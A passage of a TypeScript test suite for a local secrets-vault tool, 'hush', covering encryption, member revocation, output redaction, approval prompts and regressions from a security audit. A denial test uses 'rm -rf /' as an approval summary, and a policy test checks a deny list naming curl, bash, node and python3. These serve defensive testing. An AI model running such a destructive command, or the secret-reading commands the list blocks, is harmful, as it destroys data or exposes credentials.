import { test, describe } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, writeFileSync, mkdirSync, rmSync, readFileSync, readdirSync, chmodSync, existsSync, utimesSync , statSync } from "node:fs";
import { tmpdir, platform } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { createHash } from "node:crypto";

import {
  generateIdentity,
  encodePub,
  decodePub,
  encodeSecret,
  decodeSecret,
  sealValue,
  openValue,
  wrapDek,
  unwrapDek,
  newDek,
  fingerprint,
} from "../src/crypto.ts";
import { Vault, resolveVaultPath } from "../src/vault.ts";
import { loadPolicy } from "../src/mcp.ts";
import { assess, assessRisk, shouldNudge } from "../src/posture.ts";
import { Redactor as _R } from "../src/redact.ts";
import { migrateIdentityToKeychain, decideMigration, createIdentity, loadIdentity, publicKeyOf } from "../src/identity.ts";
import { checkAndRecord, inspect, acceptCurrent, describeRollback } from "../src/integrity.ts";
import { spawnSync, spawn } from "node:child_process";
import { Redactor, preview } from "../src/redact.ts";
import { scanRepo, reconcile, parseEnvFile } from "../src/scan.ts";
import { runWithSecrets, toEnvFile, toShellExports } from "../src/run.ts";
import { knownVars, serviceForVar, setNameFor } from "../src/services.ts";
import { requestApproval, pendingRequests, answerRequest, clearApprovalCache } from "../src/approval.ts";
import { biometryStatus, authenticate, ensureHelper } from "../src/biometry.ts";
import { ageAvailable, isAgeRecipient, wrapDekWithAge, unwrapDekWithAge, identityPlugin, ageFingerprint, ageBinary, resetAgeBinaryCache } from "../src/age.ts";
import { execFileSync } from "node:child_process";

const scratch = () => mkdtempSync(join(tmpdir(), "hush-test-"));

describe("crypto", () => {
  test("public/secret keys round-trip through their string form", () => {
    const id = generateIdentity();
    assert.equal(encodePub(decodePub(encodePub(id.pub))), encodePub(id.pub));
    const back = decodeSecret(encodeSecret(id));
    assert.deepEqual(back.pub, id.pub);
    assert.deepEqual(back.priv, id.priv);
  });

  test("rejects a malformed public key", () => {
    assert.throws(() => decodePub("not-a-key"), /not a hush public key/);
    assert.throws(() => decodePub("hush_pk_YWJj"), /32 bytes/);
  });

  test("a value round-trips under the DEK", () => {
    const dek = newDek();
    const sealed = sealValue(dek, "prod", "API_KEY", "sk_live_abc123");
    assert.equal(openValue(dek, "prod", "API_KEY", sealed), "sk_live_abc123");
  });

  test("AAD binds a ciphertext to its env and key — it cannot be moved", () => {
    const dek = newDek();
    const sealed = sealValue(dek, "staging", "DATABASE_URL", "postgres://staging");
    // Same DEK, same ciphertext, different slot: must fail, not silently decrypt.
    assert.throws(() => openValue(dek, "prod", "DATABASE_URL", sealed));
    assert.throws(() => openValue(dek, "staging", "REDIS_URL", sealed));
  });

  test("a tampered ciphertext fails the auth tag", () => {
    const dek = newDek();
    const sealed = sealValue(dek, "default", "K", "value");
    const flipped = Buffer.from(sealed.ct, "base64");
    flipped[0] ^= 0xff;
    assert.throws(() => openValue(dek, "default", "K", { ...sealed, ct: flipped.toString("base64") }));
  });

  test("DEK wrapping is per-recipient", () => {
    const dek = newDek();
    const alice = generateIdentity();
    const mallory = generateIdentity();
    const forAlice = wrapDek(dek, alice.pub);

    assert.deepEqual(unwrapDek(forAlice, alice), dek);
    assert.throws(() => unwrapDek(forAlice, mallory));
  });

  test("wrapping the same DEK twice produces different ciphertext", () => {
    const dek = newDek();
    const id = generateIdentity();
    assert.notEqual(wrapDek(dek, id.pub).ct, wrapDek(dek, id.pub).ct);
  });
});

describe("vault", () => {
  const setup = () => {
    const dir = scratch();
    const owner = generateIdentity();
    const vault = Vault.create(join(dir, "vault.json"), "test", { name: "alice", pub: owner.pub });
    return { dir, owner, vault };
  };

  test("stores ciphertext only — no plaintext hits the file", () => {
    const { dir, owner, vault } = setup();
    vault.set(owner, "default", "STRIPE", "sk_live_supersecret_value");
    vault.save();
    const raw = readFileSync(join(dir, "vault.json"), "utf8");
    assert.ok(!raw.includes("sk_live_supersecret_value"));
    assert.ok(raw.includes("STRIPE")); // names are not secret
    rmSync(dir, { recursive: true, force: true });
  });

  test("set and get round-trip", () => {
    const { owner, vault } = setup();
    vault.set(owner, "default", "K", "v");
    assert.equal(vault.get(owner, "default", "K"), "v");
  });

  test("environments are isolated", () => {
    const { owner, vault } = setup();
    vault.set(owner, "dev", "DATABASE_URL", "postgres://dev");
    vault.set(owner, "prod", "DATABASE_URL", "postgres://prod");
    assert.equal(vault.get(owner, "dev", "DATABASE_URL"), "postgres://dev");
    assert.equal(vault.get(owner, "prod", "DATABASE_URL"), "postgres://prod");
    assert.deepEqual(vault.envNames(), ["default", "dev", "prod"]);
  });

  test("a non-recipient cannot open the vault", () => {
    const { vault } = setup();
    const outsider = generateIdentity();
    assert.equal(vault.canRead(outsider), false);
    assert.throws(() => vault.dek(outsider), /not a recipient/);
  });

  test("adding a member grants access without touching the values", () => {
    const { owner, vault } = setup();
    vault.set(owner, "default", "K", "shared-value");
    const bob = generateIdentity();
    vault.addRecipient(owner, "bob", encodePub(bob.pub));
    assert.equal(vault.get(bob, "default", "K"), "shared-value");
  });

  test("removing a member revokes them and re-seals every value", () => {
    const { owner, vault } = setup();
    const bob = generateIdentity();
    vault.addRecipient(owner, "bob", encodePub(bob.pub));
    vault.set(owner, "default", "K", "v1");
    vault.set(owner, "prod", "K2", "v2");
    assert.equal(vault.get(bob, "default", "K"), "v1");

    const genBefore = vault.data.dek.generation;
    const { reEncrypted } = vault.removeRecipient(owner, "bob");

    assert.equal(reEncrypted, 2);
    assert.equal(vault.data.dek.generation, genBefore + 1);
    assert.equal(vault.canRead(bob), false);
    assert.throws(() => vault.get(bob, "default", "K"), /not a recipient/);
    // The remaining member is unaffected.
    assert.equal(vault.get(owner, "default", "K"), "v1");
    assert.equal(vault.get(owner, "prod", "K2"), "v2");
  });

  test("a revoked member's stale copy of the file is useless against new values", () => {
    const dir = scratch();
    const owner = generateIdentity();
    const bob = generateIdentity();
    const path = join(dir, "vault.json");
    const vault = Vault.create(path, "t", { name: "alice", pub: owner.pub });
    vault.addRecipient(owner, "bob", encodePub(bob.pub));
    vault.set(owner, "default", "K", "old");
    vault.save();

    vault.removeRecipient(owner, "bob");
    vault.set(owner, "default", "K", "rotated");
    vault.save();

    const reopened = Vault.open(path);
    assert.throws(() => reopened.get(bob, "default", "K"));
    assert.equal(reopened.get(owner, "default", "K"), "rotated");
    rmSync(dir, { recursive: true, force: true });
  });

  test("you cannot remove yourself", () => {
    const { owner, vault } = setup();
    assert.throws(() => vault.removeRecipient(owner, "alice"), /would remove your own last key/);
  });

  test("rotate keeps values readable for everyone who remains", () => {
    const { owner, vault } = setup();
    const bob = generateIdentity();
    vault.addRecipient(owner, "bob", encodePub(bob.pub));
    vault.set(owner, "default", "K", "v");
    vault.rotate(owner);
    assert.equal(vault.get(owner, "default", "K"), "v");
    assert.equal(vault.get(bob, "default", "K"), "v");
  });

  test("list never returns values", () => {
    const { owner, vault } = setup();
    vault.set(owner, "default", "SECRET", "do-not-leak");
    const listed = JSON.stringify(vault.list("default"));
    assert.ok(!listed.includes("do-not-leak"));
    assert.ok(listed.includes("SECRET"));
  });
});

describe("redactor", () => {
  test("masks a value in a single chunk", () => {
    const r = new Redactor({ API_KEY: "sk_live_1234567890" });
    assert.equal(r.push("using sk_live_1234567890 now") + r.flush(), "using [redacted:API_KEY] now");
  });

  test("masks a value split across chunks", () => {
    const r = new Redactor({ API_KEY: "sk_live_1234567890" });
    const outParts = ["using sk_live_", "1234567890 now"].map((c) => r.push(c));
    assert.equal(outParts.join("") + r.flush(), "using [redacted:API_KEY] now");
  });

  test("masks a value fed one character at a time", () => {
    const secret = "postgres://user:hunter2@db.internal:5432/app";
    const r = new Redactor({ DATABASE_URL: secret });
    let out = "";
    for (const ch of `db=${secret}!`) out += r.push(ch);
    out += r.flush();
    assert.equal(out, "db=[redacted:DATABASE_URL]!");
  });

  test("masks two secrets when a complete match straddles the emit boundary", () => {
    // Regression: the shorter secret was emitted before the longer one closed.
    const short = "sk_live_51ABCDEFxxxxxxxxxxxxxxxxx";
    const long = "postgres://user:hunter2@db.internal:5432/app";
    const r = new Redactor({ STRIPE: short, DB: long });
    const out = r.push(`LEAK: ${short} ${long}\n`) + r.flush();
    assert.equal(out, "LEAK: [redacted:STRIPE] [redacted:DB]\n");
    assert.ok(!out.includes("hunter2"));
  });

  test("prefers the longest match when one value contains another", () => {
    const r = new Redactor({ SHORT: "abc12345", LONG: "abc12345678" });
    assert.equal(r.push("x abc12345678 y") + r.flush(), "x [redacted:LONG] y");
  });

  test("ignores values too short or too common to be worth masking", () => {
    const r = new Redactor({ DEBUG: "true", PORT: "3000", EMPTY: "" });
    assert.equal(r.size, 0);
    assert.equal(r.push("DEBUG=true PORT=3000") + r.flush(), "DEBUG=true PORT=3000");
  });

  test("passes text through untouched when there is nothing to mask", () => {
    const r = new Redactor({});
    assert.equal(r.push("hello world") + r.flush(), "hello world");
  });

  test("preview never reveals more than a quarter of a value", () => {
    // This string is what an agent sees via hush_describe_secret.
    for (const v of ["abc", "hunter2", "tok_9f2a1b", "short12chars", "sk_live_51ABCDEFGH", "AKIAIOSFODNN7EXAMPLE", "x".repeat(64)]) {
      const p = preview(v);
      // Count characters actually printed, ignoring the "(N chars)" suffix and
      // the masking dots. Substring matching miscounts a repeated-character value.
      const shown = p.replace(/\(\d+ chars\)/, "").replace(/[^A-Za-z0-9_]/g, "").length;
      assert.ok(!p.includes(v), `preview leaked the whole value for length ${v.length}`);
      assert.ok(shown <= Math.ceil(v.length / 4), `revealed ${shown} of ${v.length} chars: ${p}`);
    }
  });

  test("short values reveal no characters at all", () => {
    for (const v of ["abc", "hunter2", "tok_9f2a1b", "short12chars", "nineteen_chars_xyz"]) {
      assert.ok(!/[A-Za-z0-9]/.test(preview(v).replace(/\(\d+ chars\)/, "")), `leaked characters of ${v}`);
    }
  });

  test("longer values show a recognisable prefix and suffix", () => {
    const p = preview("sk_live_51ABCDEFGHIJKLMNOP");
    assert.match(p, /^sk_…OP \(26 chars\)$/);
  });
});

describe("scan", () => {
  test("parses a .env file", () => {
    const parsed = parseEnvFile(`
# a comment
FOO=bar
export BAZ="quoted value"
QUOTED='single'
BLANK=
not a var
`);
    assert.deepEqual(parsed, { FOO: "bar", BAZ: "quoted value", QUOTED: "single", BLANK: "" });
  });

  test("finds env vars across languages and skips ambient ones", () => {
    const dir = scratch();
    writeFileSync(join(dir, "a.js"), `process.env.STRIPE_KEY; process.env["DB_URL"]; process.env.PATH;`);
    writeFileSync(join(dir, "b.py"), `os.environ["REDIS_URL"]\nos.getenv("SENDGRID_KEY")`);
    writeFileSync(join(dir, "c.go"), `os.Getenv("GO_TOKEN")`);
    writeFileSync(join(dir, "d.rs"), `std::env::var("RUST_TOKEN")`);
    mkdirSync(join(dir, "node_modules"));
    writeFileSync(join(dir, "node_modules", "junk.js"), `process.env.SHOULD_NOT_APPEAR;`);

    const names = scanRepo(dir).map((u) => u.name);
    for (const expected of ["STRIPE_KEY", "DB_URL", "REDIS_URL", "SENDGRID_KEY", "GO_TOKEN", "RUST_TOKEN"]) {
      assert.ok(names.includes(expected), `expected to find ${expected}`);
    }
    assert.ok(!names.includes("PATH"), "PATH is ambient, not config");
    assert.ok(!names.includes("SHOULD_NOT_APPEAR"), "node_modules must be skipped");
    rmSync(dir, { recursive: true, force: true });
  });

  test("reads declared vars out of .env.example", () => {
    const dir = scratch();
    writeFileSync(join(dir, ".env.example"), "DECLARED_ONLY=\nALSO_DECLARED=x");
    const usages = scanRepo(dir);
    assert.ok(usages.find((u) => u.name === "DECLARED_ONLY")?.declared);
    rmSync(dir, { recursive: true, force: true });
  });

  test("reconcile splits needed vars into satisfied and missing", () => {
    const usages = [
      { name: "HAVE", sites: ["a.js"], declared: false },
      { name: "MISSING", sites: ["b.js"], declared: false },
    ];
    const r = reconcile(usages, ["HAVE", "EXTRA"]);
    assert.deepEqual(r.satisfied, ["HAVE"]);
    assert.deepEqual(r.missing.map((m) => m.name), ["MISSING"]);
    assert.deepEqual(r.unused, ["EXTRA"]);
  });
});

describe("run", () => {
  test("injects secrets into the child and redacts them out of its output", async () => {
    const result = await runWithSecrets(
      process.execPath,
      ["-e", 'console.log("value is", process.env.MY_SECRET, "len", process.env.MY_SECRET.length)'],
      { secrets: { MY_SECRET: "topsecret-value-123" }, capture: true },
    );
    assert.equal(result.code, 0);
    assert.ok(!result.stdout.includes("topsecret-value-123"), "secret must not reach the caller");
    assert.ok(result.stdout.includes("[redacted:MY_SECRET]"));
    assert.ok(result.stdout.includes("len 19"), "the child saw the real value");
    assert.equal(result.redactions, 1);
  });

  test("does not hand the child the vault identity", async () => {
    process.env.HUSH_IDENTITY = "hush_sk_should_not_propagate";
    const result = await runWithSecrets(
      process.execPath,
      ["-e", 'console.log("id:", process.env.HUSH_IDENTITY ?? "absent")'],
      { secrets: {}, capture: true },
    );
    delete process.env.HUSH_IDENTITY;
    assert.match(result.stdout, /id: absent/);
  });

  test("reports a non-zero exit code", async () => {
    const result = await runWithSecrets(process.execPath, ["-e", "process.exit(3)"], {
      secrets: {},
      capture: true,
    });
    assert.equal(result.code, 3);
  });

  test("toEnvFile quotes values that need it", () => {
    const body = toEnvFile({ PLAIN: "abc", SPACED: "a b", EMPTY: "" });
    assert.match(body, /^PLAIN=abc$/m);
    assert.match(body, /^SPACED="a b"$/m);
    assert.match(body, /^EMPTY=""$/m);
  });
});

describe("accounts", () => {
  const setup = () => {
    const dir = scratch();
    const owner = generateIdentity();
    const vault = Vault.create(join(dir, "vault.json"), "t", { name: "omar", pub: owner.pub });
    return { dir, owner, vault };
  };

  test("resolveSets layers the chosen set over the base environment", () => {
    const { owner, vault } = setup();
    vault.set(owner, "default", "PORT_URL", "http://base");
    vault.set(owner, "fal/acme", "FAL_KEY", "fal_acme");
    vault.set(owner, "gemini/team", "GEMINI_API_KEY", "gem_team");

    const { secrets, layers } = vault.resolveSets(owner, [
      "default",
      setNameFor("fal", "acme"),
      setNameFor("gemini", "team"),
    ]);
    assert.deepEqual(secrets, {
      PORT_URL: "http://base",
      FAL_KEY: "fal_acme",
      GEMINI_API_KEY: "gem_team",
    });
    assert.deepEqual(layers, ["default", "fal/acme", "gemini/team"]);
  });

  test("a later set wins over an earlier one for the same variable", () => {
    const { owner, vault } = setup();
    vault.set(owner, "fal/personal", "FAL_KEY", "personal");
    vault.set(owner, "fal/client", "FAL_KEY", "client");
    const { secrets } = vault.resolveSets(owner, [
      setNameFor("fal", "personal"),
      setNameFor("fal", "client"),
    ]);
    assert.equal(secrets.FAL_KEY, "client");
  });

  test("an account's value is bound to its own scope", () => {
    const { owner, vault } = setup();
    vault.set(owner, "fal/acme", "FAL_KEY", "acme-key");
    // Copy acme's ciphertext into the client slot by hand.
    vault.data.envs["fal/client"] = { FAL_KEY: { ...vault.data.envs["fal/acme"].FAL_KEY } };
    assert.throws(() => vault.get(owner, "fal/client", "FAL_KEY"));
  });

  test("the catalog knows what the common services need", () => {
    assert.deepEqual(knownVars("fal"), ["FAL_KEY"]);
    assert.deepEqual(knownVars("gemini"), ["GEMINI_API_KEY"]);
    assert.equal(knownVars("aws").length, 3);
    assert.deepEqual(knownVars("nope-not-real"), []);
    assert.equal(serviceForVar("FAL_KEY"), "fal");
  });
});

describe("approval", () => {
  test("a pending request is written, answered, then cleaned up", async () => {
    process.env.HUSH_APPROVAL_MODE = "file";
    clearApprovalCache();
    const dir = scratch();

    const pending = requestApproval(dir, {
      action: "run",
      summary: "Run: npx vercel deploy",
      detail: ["Using accounts:  fal:personal"],
      scope: "run:default+fal/personal",
      ttlSeconds: 900,
      timeoutMs: 5000,
    });

    // The request file shows up for the human to answer.
    let seen: ReturnType<typeof pendingRequests> = [];
    for (let i = 0; i < 40 && !seen.length; i++) {
      seen = pendingRequests(dir);
      if (!seen.length) await new Promise((r) => setTimeout(r, 25));
    }
    assert.equal(seen.length, 1);
    assert.match(seen[0].summary, /vercel/);
    assert.match(seen[0].code, /^\d{4}$/);

    answerRequest(dir, seen[0].id, "once");
    const result = await pending;

    assert.equal(result.decision, "once");
    assert.equal(result.cached, false);
    assert.deepEqual(pendingRequests(dir), [], "request files are cleaned up");
    rmSync(dir, { recursive: true, force: true });
    delete process.env.HUSH_APPROVAL_MODE;
  });

  test("denial is reported as denial", async () => {
    process.env.HUSH_APPROVAL_MODE = "file";
    clearApprovalCache();
    const dir = scratch();
    const p = requestApproval(dir, {
      action: "run", summary: "Run: rm -rf /", scope: "run:x", ttlSeconds: 900, timeoutMs: 5000,
    });
    let seen: ReturnType<typeof pendingRequests> = [];
    for (let i = 0; i < 40 && !seen.length; i++) {
      seen = pendingRequests(dir);
      if (!seen.length) await new Promise((r) => setTimeout(r, 25));
    }
    answerRequest(dir, seen[0].id, "deny");
    assert.equal((await p).decision, "deny");
    rmSync(dir, { recursive: true, force: true });
    delete process.env.HUSH_APPROVAL_MODE;
  });

  test("no answer within the window times out rather than hanging", async () => {
    process.env.HUSH_APPROVAL_MODE = "file";
    clearApprovalCache();
    const dir = scratch();
    const result = await requestApproval(dir, {
      action: "run", summary: "unanswered", scope: "run:y", ttlSeconds: 900, timeoutMs: 700,
    });
    assert.equal(result.decision, "timeout");
    rmSync(dir, { recursive: true, force: true });
    delete process.env.HUSH_APPROVAL_MODE;
  });

  test('"allow 15 min" is remembered for that scope, and only that scope', async () => {
    process.env.HUSH_APPROVAL_MODE = "file";
    clearApprovalCache();
    const dir = scratch();
    const first = requestApproval(dir, {
      action: "run", summary: "first", scope: "run:default+fal/acme", ttlSeconds: 900, timeoutMs: 5000,
    });
    let seen: ReturnType<typeof pendingRequests> = [];
    for (let i = 0; i < 40 && !seen.length; i++) {
      seen = pendingRequests(dir);
      if (!seen.length) await new Promise((r) => setTimeout(r, 25));
    }
    answerRequest(dir, seen[0].id, "session");
    assert.equal((await first).decision, "session");

    // Same accounts: no second prompt.
    const again = await requestApproval(dir, {
      action: "run", summary: "again", scope: "run:default+fal/acme", ttlSeconds: 900, timeoutMs: 700,
    });
    assert.equal(again.cached, true);
    assert.equal(again.decision, "session");

    // A different account must ask again — this is the point of scoping.
    const other = await requestApproval(dir, {
      action: "run", summary: "other account", scope: "run:default+fal/client", ttlSeconds: 900, timeoutMs: 700,
    });
    assert.equal(other.cached, false);
    assert.equal(other.decision, "timeout");

    rmSync(dir, { recursive: true, force: true });
    delete process.env.HUSH_APPROVAL_MODE;
  });
});

describe("biometry gating", () => {
  test('"required" refuses when biometry is unavailable, rather than falling back', async () => {
    process.env.HUSH_BIOMETRY = "off";
    process.env.HUSH_APPROVAL_MODE = "file";
    clearApprovalCache();
    const dir = scratch();

    const r = await requestApproval(dir, {
      action: "run",
      summary: "Run: deploy.sh",
      scope: "run:prod",
      ttlSeconds: 900,
      timeoutMs: 500,
      biometry: "required",
    });

    assert.equal(r.decision, "deny");
    assert.equal(r.via, "none");
    assert.match(r.note ?? "", /requires biometry/);
    rmSync(dir, { recursive: true, force: true });
    delete process.env.HUSH_BIOMETRY;
    delete process.env.HUSH_APPROVAL_MODE;
  });

  test('"preferred" falls back to the normal prompt when biometry is unavailable', async () => {
    process.env.HUSH_BIOMETRY = "off";
    process.env.HUSH_APPROVAL_MODE = "file";
    clearApprovalCache();
    const dir = scratch();

    const p = requestApproval(dir, {
      action: "run", summary: "Run: npm test", scope: "run:dev",
      ttlSeconds: 900, timeoutMs: 5000, biometry: "preferred",
    });
    let seen: ReturnType<typeof pendingRequests> = [];
    for (let i = 0; i < 40 && !seen.length; i++) {
      seen = pendingRequests(dir);
      if (!seen.length) await new Promise((r) => setTimeout(r, 25));
    }
    assert.equal(seen.length, 1, "it fell back to the terminal prompt");
    answerRequest(dir, seen[0].id, "once");

    const r = await p;
    assert.equal(r.decision, "once");
    assert.equal(r.via, "terminal");
    rmSync(dir, { recursive: true, force: true });
    delete process.env.HUSH_BIOMETRY;
    delete process.env.HUSH_APPROVAL_MODE;
  });

  test("biometry status reports unavailable cleanly when switched off", () => {
    process.env.HUSH_BIOMETRY = "off";
    const st = biometryStatus();
    assert.equal(st.available, false);
    assert.equal(st.kind, "none");
    delete process.env.HUSH_BIOMETRY;
  });
});

/**
 * These exercise the age bridge — the path a YubiKey or Secure Enclave takes.
 * They need the `age` binary, so they skip rather than fail when it is absent.
 */
describe("age bridge", { skip: ageAvailable() ? false : "age binary not installed" }, () => {
  const ageKeygen = () => {
    const dir = scratch();
    const path = join(dir, "id.txt");
    const bin = (process.env.HUSH_AGE_BIN ?? "age").replace(/age$/, "age-keygen");
    execFileSync(bin, ["-o", path], { stdio: "ignore" });
    const recipient = execFileSync(bin, ["-y", path], { encoding: "utf8" }).trim();
    return { dir, path, recipient, opener: { age: { recipients: [recipient], identityPath: path } } };
  };

  test("recognises age recipients and rejects other strings", () => {
    const { recipient, dir } = ageKeygen();
    assert.ok(isAgeRecipient(recipient));
    assert.ok(!isAgeRecipient("hush_pk_82PrYsmT5ynW98v7s8Xc53Ea21tBwbdvD8aKia1wIAo"));
    assert.ok(!isAgeRecipient("not a key"));
    rmSync(dir, { recursive: true, force: true });
  });

  test("a data key round-trips through age", () => {
    const { path, recipient, dir } = ageKeygen();
    const dek = newDek();
    const wrapped = wrapDekWithAge(dek, recipient);
    assert.match(wrapped, /BEGIN AGE ENCRYPTED FILE/);
    assert.deepEqual(unwrapDekWithAge(wrapped, path), dek);
    rmSync(dir, { recursive: true, force: true });
  });

  test("a wrong age identity cannot unwrap", () => {
    const a = ageKeygen();
    const b = ageKeygen();
    const wrapped = wrapDekWithAge(newDek(), a.recipient);
    assert.throws(() => unwrapDekWithAge(wrapped, b.path), /could not decrypt/);
    rmSync(a.dir, { recursive: true, force: true });
    rmSync(b.dir, { recursive: true, force: true });
  });

  test("an age member and an X25519 member share one vault", () => {
    const dir = scratch();
    const owner = generateIdentity();
    const sam = ageKeygen();
    const vault = Vault.create(join(dir, "v.json"), "mixed", { name: "alice", pub: owner.pub });

    vault.set(owner, "default", "STRIPE_KEY", "sk_live_shared");
    vault.addRecipient(owner, "sam", sam.recipient);

    assert.equal(vault.canRead(sam.opener), true);
    assert.equal(vault.get(sam.opener, "default", "STRIPE_KEY"), "sk_live_shared");
    assert.equal(vault.get(owner, "default", "STRIPE_KEY"), "sk_live_shared");

    const kinds = vault.members().map((m) => m.kind).sort();
    assert.deepEqual(kinds, ["age", "x25519"]);
    rmSync(dir, { recursive: true, force: true });
    rmSync(sam.dir, { recursive: true, force: true });
  });

  test("a vault can be founded by an age identity alone", () => {
    const dir = scratch();
    const me = ageKeygen();
    const vault = Vault.create(join(dir, "v.json"), "hw", { name: "omar", ageRecipient: me.recipient });
    vault.set(me.opener, "default", "K", "hardware-only");
    assert.equal(vault.get(me.opener, "default", "K"), "hardware-only");
    assert.equal(vault.memberName(me.opener), "omar");
    rmSync(dir, { recursive: true, force: true });
    rmSync(me.dir, { recursive: true, force: true });
  });

  test("revoking one member re-wraps for the remaining age members", () => {
    const dir = scratch();
    const owner = generateIdentity();
    const sam = ageKeygen();
    const ana = ageKeygen();
    const vault = Vault.create(join(dir, "v.json"), "mixed", { name: "alice", pub: owner.pub });
    vault.set(owner, "default", "K", "v1");
    vault.addRecipient(owner, "sam", sam.recipient);
    vault.addRecipient(owner, "ana", ana.recipient);

    vault.removeRecipient(owner, "sam");

    assert.equal(vault.canRead(sam.opener), false);
    assert.throws(() => vault.get(sam.opener, "default", "K"), /not a recipient/);
    // The surviving hardware member must have been re-wrapped under the new DEK.
    assert.equal(vault.get(ana.opener, "default", "K"), "v1");
    assert.equal(vault.get(owner, "default", "K"), "v1");
    assert.equal(vault.data.dek.generation, 2);

    for (const d of [dir, sam.dir, ana.dir]) rmSync(d, { recursive: true, force: true });
  });

  test("an age member cannot remove themselves", () => {
    const dir = scratch();
    const me = ageKeygen();
    const vault = Vault.create(join(dir, "v.json"), "hw", { name: "omar", ageRecipient: me.recipient });
    assert.throws(() => vault.removeRecipient(me.opener, "omar"), /would remove your own last key/);
    rmSync(dir, { recursive: true, force: true });
    rmSync(me.dir, { recursive: true, force: true });
  });
});

/** Regressions from the security audit. Each of these was once exploitable. */
describe("audit regressions", () => {
  test("save() is atomic and leaves no temp files behind", () => {
    const dir = scratch();
    const path = join(dir, "vault.json");
    const owner = generateIdentity();
    const vault = Vault.create(path, "t", { name: "a", pub: owner.pub });
    vault.set(owner, "default", "K", "v");
    vault.save();

    assert.deepEqual(
      readdirSync(dir).filter((f) => f.includes(".tmp")),
      [],
      "a temp file was left on disk",
    );
    assert.doesNotThrow(() => JSON.parse(readFileSync(path, "utf8")));
    rmSync(dir, { recursive: true, force: true });
  });

  test("a failed save leaves the previous vault intact rather than truncated", () => {
    const dir = scratch();
    const path = join(dir, "vault.json");
    const owner = generateIdentity();
    const vault = Vault.create(path, "t", { name: "a", pub: owner.pub });
    vault.set(owner, "default", "KEEP", "original");
    vault.save();
    const before = readFileSync(path, "utf8");

    // Make serialisation fail the way a disk error would: after the file exists.
    (vault.data as unknown as { boom: unknown }).boom = { self: null as unknown };
    (vault.data as unknown as { boom: { self: unknown } }).boom.self =
      (vault.data as unknown as { boom: unknown }).boom;

    assert.throws(() => vault.save());
    assert.equal(readFileSync(path, "utf8"), before, "the old vault was damaged");
    assert.deepEqual(readdirSync(dir).filter((f) => f.includes(".tmp")), []);
    rmSync(dir, { recursive: true, force: true });
  });

  test("a child process never inherits the HUSH_* namespace", async () => {
    // Any one of these lets the child re-open the vault and read everything.
    for (const k of ["HUSH_IDENTITY", "HUSH_IDENTITY_FILE", "HUSH_VAULT", "HUSH_HOME", "HUSH_AGE_IDENTITY"]) {
      process.env[k] = "leaked-" + k;
    }
    const result = await runWithSecrets(
      process.execPath,
      ["-e", 'console.log(Object.keys(process.env).filter(k=>k.startsWith("HUSH_")).sort().join(","))'],
      { secrets: { API_KEY: "value-for-child" }, capture: true },
    );
    for (const k of ["HUSH_IDENTITY", "HUSH_IDENTITY_FILE", "HUSH_VAULT", "HUSH_HOME", "HUSH_AGE_IDENTITY"]) {
      delete process.env[k];
    }
    assert.equal(result.stdout.trim(), "HUSH_ACTIVE", "hush config leaked into the child");
  });

  test("a secret deliberately named HUSH_* is still delivered", async () => {
    const result = await runWithSecrets(
      process.execPath,
      ["-e", 'console.log(process.env.HUSH_MY_OWN_VAR ? "delivered" : "missing")'],
      { secrets: { HUSH_MY_OWN_VAR: "mine" }, capture: true, redact: false },
    );
    assert.match(result.stdout, /delivered/);
  });

  test("policy.json cannot hold the deny list below the built-in floor", () => {
    const dir = scratch();
    // Exactly what an older hush wrote: a short list, missing interpreters.
    writeFileSync(
      join(dir, "policy.json"),
      JSON.stringify({ denyCommands: ["env", "cat"], allowEnvs: ["dev"] }),
    );
    const policy = loadPolicy(dir);

    assert.ok(policy.denyCommands.includes("node"), "stale config dropped a protection");
    assert.ok(policy.denyCommands.includes("python3"));
    assert.ok(policy.denyCommands.includes("curl"));
    assert.ok(policy.denyCommands.includes("env"));
    // The rest of the file is still honoured.
    assert.deepEqual(policy.allowEnvs, ["dev"]);
    rmSync(dir, { recursive: true, force: true });
  });

  test("unsafeAllowCommands is the only way below the floor", () => {
    const dir = scratch();
    writeFileSync(join(dir, "policy.json"), JSON.stringify({ unsafeAllowCommands: ["node"] }));
    const policy = loadPolicy(dir);
    assert.ok(!policy.denyCommands.includes("node"), "explicit opt-out did not apply");
    assert.ok(policy.denyCommands.includes("bash"), "it removed more than asked");
    rmSync(dir, { recursive: true, force: true });
  });

  test("an approval granted for one vault does not carry to another", async () => {
    process.env.HUSH_BIOMETRY = "off";
    process.env.HUSH_APPROVAL_MODE = "file";
    clearApprovalCache();
    const vaultA = scratch();
    const vaultB = scratch();

    const p = requestApproval(vaultA, {
      action: "run", summary: "deploy", scope: "run:default", ttlSeconds: 900, timeoutMs: 5000,
    });
    let seen: ReturnType<typeof pendingRequests> = [];
    for (let i = 0; i < 40 && !seen.length; i++) {
      seen = pendingRequests(vaultA);
      if (!seen.length) await new Promise((r) => setTimeout(r, 25));
    }
    answerRequest(vaultA, seen[0].id, "session");
    assert.equal((await p).decision, "session");

    // Same scope string, different vault: must ask again, not reuse the grant.
    const other = await requestApproval(vaultB, {
      action: "run", summary: "deploy", scope: "run:default", ttlSeconds: 900, timeoutMs: 600,
    });
    assert.equal(other.cached, false, "a grant leaked between vaults");
    assert.equal(other.decision, "timeout");

    for (const d of [vaultA, vaultB]) rmSync(d, { recursive: true, force: true });
    delete process.env.HUSH_BIOMETRY;
    delete process.env.HUSH_APPROVAL_MODE;
  });

  test("a failed re-seal leaves the member list unchanged", () => {
    const dir = scratch();
    const owner = generateIdentity();
    const bob = generateIdentity();
    const vault = Vault.create(join(dir, "v.json"), "t", { name: "alice", pub: owner.pub });
    vault.addRecipient(owner, "bob", encodePub(bob.pub));
    vault.set(owner, "default", "K", "v");

    // Corrupt a remaining recipient's key so re-wrapping throws mid-way.
    const carol = generateIdentity();
    vault.addRecipient(owner, "carol", encodePub(carol.pub));
    vault.data.recipients[fingerprint(carol.pub)].pk = "hush_pk_not-a-real-key";

    assert.throws(() => vault.removeRecipient(owner, "bob"));
    // Bob must still be listed, and everyone who could read still can.
    assert.ok(vault.members().some((m) => m.name === "bob"), "member dropped despite failure");
    assert.equal(vault.get(owner, "default", "K"), "v");
    rmSync(dir, { recursive: true, force: true });
  });
});

describe("security ladder", () => {
  /** A vault plus a .hush dir, with the environment pinned so rungs are deterministic. */
  const rig = () => {
    const dir = scratch();
    const hushDir = join(dir, ".hush");
    mkdirSync(hushDir, { recursive: true });
    const owner = generateIdentity();
    const vault = Vault.create(join(hushDir, "vault.json"), "t", { name: "a", pub: owner.pub });
    return { dir, hushDir, owner, vault };
  };

  const pin = () => {
    process.env.HUSH_BIOMETRY = "off";
